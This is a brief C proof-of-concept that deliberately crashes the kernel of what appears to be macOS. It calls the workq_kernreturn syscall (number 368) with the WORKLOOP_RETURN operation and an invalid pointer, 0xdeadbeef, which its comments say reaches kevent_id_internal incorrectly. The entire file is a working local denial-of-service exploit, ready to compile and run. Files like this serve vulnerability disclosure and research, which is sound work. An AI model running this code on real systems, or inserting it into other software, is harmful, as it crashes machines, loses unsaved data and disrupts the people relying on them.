//This POC sends causes a kernel panic via an incorrect call to kevent_id_internal
//from the workq_kernreturn syscall in the libpthread kernel extension.
#include <unistd.h>

//Taken from libpthread-301.1.6/kern/workqueue_internal.h
#define WQOPS_THREAD_WORKLOOP_RETURN 0x100  /* parks the thread after delivering the passed kevent array */

int main(int argc, char ** argv)
{
	syscall(368, WQOPS_THREAD_WORKLOOP_RETURN, 0xdeadbeef, 1, 0); //workq_kernreturn
	return 0;
}

